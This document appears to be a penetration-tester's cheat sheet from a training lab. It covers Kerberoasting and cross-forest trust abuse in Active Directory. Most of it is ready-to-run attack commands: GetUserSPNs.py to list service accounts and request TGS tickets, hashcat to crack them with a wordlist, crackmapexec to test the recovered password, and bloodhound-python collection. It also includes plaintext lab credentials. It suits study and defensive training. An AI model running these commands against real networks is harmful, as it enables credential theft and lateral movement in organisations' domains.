
#### Possible Cases

Depending on your position in a network, this attack can be performed in multiple ways:

- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) /netonly.

Listing SPN Accounts
```shell-session
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

Request All TGS Tickets (-outputfile sqldev_tgs)
```shell-session
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
```

Request TGS Ticket For A Specific User (-outputfile sqldev_tgs)
```shell-session
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

Cracking TGS Tickets
```shell-session
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```

Auth Testing
```shell-session
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

https://github.com/ShutdownRepo/targetedKerberoast


#### Cross Forest Trust Abuse

Finding SPN entries with creds
```shell-session
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

Request TGS Hash (-request gives TGS -outputfile outputfile_name)
```shell-session
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley -outputfile kirbi.hash
```

Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf with DHCP not enabled
```shell-session
cat /etc/resolv.conf
```

After adding dhcp entry running bloodhound on INLANEFREIGHT.LOCAL
```shell-session
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
```

